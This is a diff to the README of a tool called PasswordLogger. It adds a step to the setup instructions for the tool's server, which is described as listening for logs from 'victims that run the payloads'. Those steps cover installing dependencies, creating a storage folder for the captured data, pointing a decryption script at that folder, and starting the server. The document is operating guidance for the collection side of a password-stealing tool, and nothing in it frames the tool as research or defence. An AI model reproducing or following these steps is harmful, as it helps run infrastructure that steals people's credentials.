@@ -20,7 +20,8 @@ different victims that run the payloads data)
 
 1. Go to this line (code snippet linked) and change the directory according to your computer. By change it according to your computer, I mean copy the exact path of the storage folder in the server directory and paste it into that variable.https://github.com/brlyndev/PasswordLogger/blob/a60e6495e6f0d4bb6dafdcd6f9d600f666293d29/server/decrypt.py#L21-L26
 2. CD into the server directory and run `npm install` (Make sure you have NodeJS *v18.12.1* installed)
-3. To start the server, CD into the server directory and run `npm start` in the console.
+3. Make the storage directory. To do this, just make a folder called "storage" inside of the server directory.
+4. To start the server, CD into the server directory and run `npm start` in the console.
 
 After you have ran `npm start`, the server will be running and listening for logs.
 
